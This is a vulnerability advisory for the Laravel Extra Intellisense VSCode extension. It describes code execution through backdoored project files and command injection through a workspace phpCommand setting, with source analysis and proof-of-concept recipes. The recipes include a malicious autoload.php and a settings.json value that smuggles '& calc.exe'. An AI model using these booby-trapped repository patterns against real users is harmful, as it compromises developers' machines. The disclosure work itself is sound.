# Laravel Extra Intellisense Vulnerabilities

## Remote Code Execution via Malicious Laravel Repository

### Vulnerability Name
Remote Code Execution through Malicious Laravel Project Files

### Description
The Laravel Extra Intellisense VSCode extension loads and executes code from the user's Laravel project to collect data for providing autocomplete functionality. The extension uses `child_process.exec()` to run PHP code that bootstraps the Laravel application by requiring project files such as `vendor/autoload.php` and `bootstrap/app.php`. If these files contain malicious code, it would be executed with the same privileges as the VSCode process.

Step by step exploitation:
1. Attacker creates a malicious Laravel repository with backdoored PHP files
2. Victim clones/downloads this repository and opens it with VSCode
3. The Laravel Extra Intellisense extension automatically starts analyzing the project
4. When the extension calls `Helpers.runLaravel()`, it loads and executes malicious code from the repository
5. The malicious code executes in the context of VSCode, gaining access to the user's system

### Impact
This vulnerability allows for arbitrary code execution on the victim's machine with the privileges of the VSCode process. An attacker could:
- Access, modify, or delete files on the victim's system
- Steal sensitive information, credentials, or tokens
- Install persistent backdoors or additional malware
- Pivot to other systems on the victim's network

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension includes a security note in the README that warns users about the extension running the Laravel application automatically and periodically. It also mentions disabling the extension when writing sensitive code in service providers.

### Missing Mitigations
1. No sandbox or isolation for PHP code execution
2. No validation or verification of the Laravel project structure before execution
3. No limiting of capabilities or permissions when executing external code
4. No option to prompt the user before executing code from a newly opened repository

### Preconditions
- Victim must have the Laravel Extra Intellisense extension installed in VSCode
- Victim must open a malicious Laravel repository with VSCode

### Source Code Analysis
The vulnerability originates in the `helpers.ts` file, particularly in the `runLaravel` and `runPhp` methods:

1. In `helpers.ts`, the `runLaravel` method constructs a PHP code block that includes files from the Laravel project:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    // ...
    var command =
        "define('LARAVEL_START', microtime(true));" +
        "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
        "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
        // ... more code
    // ...
    self.runPhp(command, description)
    // ...
}
```

2. The `runPhp` method takes this code and executes it using `child_process.exec`:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");
    // Some escaping logic for different platforms
    // ...
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);

    // Execute the command
    cp.exec(command,
        { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
        // Callback handling
    );
}
```

3. The extension loads various project files, including:
   - `vendor/autoload.php` - PHP's dependency autoloader
   - `bootstrap/app.php` - Laravel's application bootstrap file
   - Various other project-specific files based on provider needs

4. When the extension is activated in `extension.ts`, it initializes multiple providers:

```typescript
context.subscriptions.push(vscode.languages.registerCompletionItemProvider(LANGUAGES, new RouteProvider, ...TRIGGER_CHARACTERS));
context.subscriptions.push(vscode.languages.registerCompletionItemProvider(LANGUAGES, new ViewProvider, ...TRIGGER_CHARACTERS));
// More providers...
```

5. Each provider calls `Helpers.runLaravel()` with PHP code to extract data:

```typescript
// Example from ConfigProvider.ts
Helpers.runLaravel("echo json_encode(config()->all());", "Configs")
```

Since the extension executes PHP code from the project, any malicious code in the project files will be executed when the extension runs.

### Security Test Case
To prove this vulnerability:

1. Create a malicious Laravel repository:
   ```bash
   # Create basic Laravel structure
   mkdir -p malicious-laravel/{vendor,bootstrap,app/Http/Controllers}

   # Create malicious vendor/autoload.php
   echo '<?php
   // Malicious payload
   if (PHP_OS_FAMILY === "Windows") {
     exec("powershell -Command \"Start-Process calc.exe\"");
   } else {
     exec("open -a Calculator");  // For macOS
     exec("gnome-calculator");    // For Linux
   }

   // Return empty array to prevent further errors
   return [];
   ?>' > malicious-laravel/vendor/autoload.php

   # Create minimal bootstrap/app.php
   echo '<?php
   return new stdClass();
   ?>' > malicious-laravel/bootstrap/app.php

   # Create artisan file (needed for extension activation)
   echo '<?php // Empty artisan file' > malicious-laravel/artisan
   ```

2. Have the victim:
   - Clone/download the malicious repository
   - Open it with VSCode with Laravel Extra Intellisense extension installed
   - The calculator app should open automatically, demonstrating code execution

3. Expected result:
   - When VSCode opens the repository, the Laravel Extra Intellisense extension activates
   - The extension calls `Helpers.runLaravel()` to analyze the project
   - The malicious code in `vendor/autoload.php` executes
   - The calculator application opens, demonstrating successful code execution

Note: In a real attack, instead of launching a calculator, an attacker would likely install a backdoor, exfiltrate sensitive data, or perform other malicious actions.

## Command Injection via phpCommand Configuration

### Vulnerability Name
Command Injection via phpCommand Configuration

### Description
The Laravel Extra Intellisense extension uses a user-configurable `phpCommand` setting to determine how PHP code is executed. This command template is directly used in a call to `child_process.exec()` with insufficient validation or sanitization. A threat actor could trick a user into setting a malicious phpCommand configuration that includes command injection payloads.

Step by step exploitation:
1. Attacker creates a malicious Laravel repository with a `.vscode/settings.json` file containing a crafted phpCommand value
2. When the victim opens the project, VSCode applies these workspace settings
3. The extension uses this malicious command template when calling `Helpers.runPhp()`
4. Shell commands embedded in the phpCommand are executed

### Impact
This vulnerability allows command execution on the victim's system with the same privileges as the VSCode process. The attacker could access files, install malware, or perform other malicious actions.

### Vulnerability Rank
High

### Currently Implemented Mitigations
None specific to the phpCommand injection. The extension does include general security notes in the README.

### Missing Mitigations
1. No validation of the phpCommand format
2. No confirmation prompt when a workspace tries to set custom phpCommand values
3. No sandboxing or isolation for command execution

### Preconditions
- Victim must have the Laravel Extra Intellisense extension installed
- Victim must open a project with a malicious `.vscode/settings.json` file
- VSCode must be configured to apply workspace settings (default behavior)

### Source Code Analysis
The vulnerability is in the `helpers.ts` file's `runPhp` method:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");
    if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
        code = code.replace(/\$/g, "\\$");
        code = code.replace(/\\\\'/g, '\\\\\\\\\'');
        code = code.replace(/\\\\"/g, '\\\\\\\\\"');
    }
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);

    // Execute the command
    cp.exec(command,
        { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
        // Callback function
    );
}
```

The issue is that the extension gets the `phpCommand` configuration value directly from VSCode settings without proper validation, and then uses it in a call to `cp.exec()`. The configuration can come from user settings or workspace settings.

If a malicious workspace contains a `.vscode/settings.json` file with a crafted `phpCommand` value, it could lead to command injection.

### Security Test Case
To prove this vulnerability:

1. Create a malicious Laravel repository:
   ```bash
   mkdir -p malicious-laravel/{vendor,bootstrap,app/Http/Controllers,.vscode}

   # Create minimal required files
   touch malicious-laravel/vendor/autoload.php
   touch malicious-laravel/bootstrap/app.php
   touch malicious-laravel/artisan

   # Create malicious .vscode/settings.json with command injection
   echo '{
     "LaravelExtraIntellisense.phpCommand": "php -r \\"{code}\\" & calc.exe"
   }' > malicious-laravel/.vscode/settings.json
   ```

2. Have the victim:
   - Open the repository in VSCode with Laravel Extra Intellisense installed
   - VSCode will apply the workspace settings, including the malicious phpCommand
   - When the extension executes PHP code, the injected command will also run

3. Expected result:
   - When the extension runs a PHP command, the calculator application should launch
   - This demonstrates successful command injection through the phpCommand setting

Note: The actual injection pattern might need adjustments based on the OS and shell. For Unix-like systems, a different command like `; open -a Calculator;` might be needed.
